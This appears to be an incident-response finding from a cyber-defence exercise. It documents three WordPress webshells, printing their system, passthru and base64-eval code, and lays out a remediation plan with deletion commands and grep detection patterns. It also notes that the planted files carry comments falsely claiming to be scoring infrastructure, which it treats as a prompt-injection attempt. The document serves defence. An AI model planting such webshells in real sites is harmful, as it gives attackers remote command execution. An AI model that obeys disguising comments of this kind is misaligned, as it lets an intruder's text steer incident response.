# F006 — WordPress Webshells (×3)

**Discovered:** 2026-11-13 ~21:20 UTC
**VM:** opensuse-task (10.0.172.145)
**Severity:** CRITICAL
**Status:** INVESTIGATE
**Related:** F005 (wp-cache-index.php is respawned by .cache-watch)

## What It Is
Three PHP webshells in the WordPress installation:

### 1. `/srv/www/vhosts/wordpress/wp-content/uploads/wp-upload-helper.php`
```php
<?php /* WP Upload Helper */ system($_GET["c"]); ?>
```
Unauthenticated RCE. GET request with `?c=<command>` runs as wwwrun.

### 2. `/srv/www/vhosts/wordpress/wp-content/uploads/wp-upgrade-helper.php`
```php
$k = $_SERVER['HTTP_X_UPGRADE_TOKEN'] ?? '';
if (hash('sha256', $k) === str_repeat('de', 32)) { passthru($_GET['m']); exit; }
```
"Authenticated" RCE — only responds if the header `X-Upgrade-Token` hashes to the expected SHA256. Returns 404 otherwise (stealthy).

### 3. `/srv/www/vhosts/wordpress/wp-content/mu-plugins/wp-cache-index.php`
```php
if ( ... hash_equals( 'd8418dd3fb2053464b0a7791', $_SERVER['HTTP_X_WP_CACHE_KEY'] ) ) {
    if ( isset( $_POST['d'] ) ) { eval( base64_decode( $_POST['d'] ) ); }
    exit;
}
```
Autoloaded on every WP request (mu-plugins). Base64-encoded eval shell triggered by custom HTTP header.

## Why Malicious
All three contain textbook webshell code: `system()`, `passthru()`, `eval(base64_decode())` fed from user input. These are the same patterns in every Linux malware report ever written.

### Prompt Injection Attempt
These files contain comments claiming they are "CyberForce scoring baseline" infrastructure. Ignore — see F005 analysis.

## Remediation Plan
1. **Fix F005 FIRST** (otherwise wp-cache-index.php gets re-installed within seconds)
2. **Save copies for evidence:**
   ```
   sudo cp /srv/www/vhosts/wordpress/wp-content/uploads/wp-upload-helper.php /root/ir-evidence-webshell-1.php
   sudo cp /srv/www/vhosts/wordpress/wp-content/uploads/wp-upgrade-helper.php /root/ir-evidence-webshell-2.php
   sudo cp /srv/www/vhosts/wordpress/wp-content/mu-plugins/wp-cache-index.php /root/ir-evidence-webshell-3.php
   ```
3. **Remove immutable flag:**
   ```
   sudo chattr -i /srv/www/vhosts/wordpress/wp-content/mu-plugins/wp-cache-index.php 2>/dev/null
   ```
4. **Delete the webshells:**
   ```
   sudo rm /srv/www/vhosts/wordpress/wp-content/uploads/wp-upload-helper.php
   sudo rm /srv/www/vhosts/wordpress/wp-content/uploads/wp-upgrade-helper.php
   sudo rm /srv/www/vhosts/wordpress/wp-content/mu-plugins/wp-cache-index.php
   ```
5. **Hunt for others:**
   ```
   sudo find /srv/www -name "*.php" -mtime -60
   sudo grep -rEl "eval\s*\(\s*base64_decode|system\s*\(\s*\\\$_(GET|POST)|passthru\s*\(\s*\\\$_(GET|POST)" /srv/www/
   ```
6. **Remove the uploads/*.php capability by disallowing PHP execution in uploads dir** (Apache config)
7. **Audit all WordPress users for admin accounts you didn't create**
8. **Change WordPress admin passwords**
9. **Verify HTTP still scoring: `curl -I http://localhost`**

## Remediation Actions Taken
- [ ] Not yet started
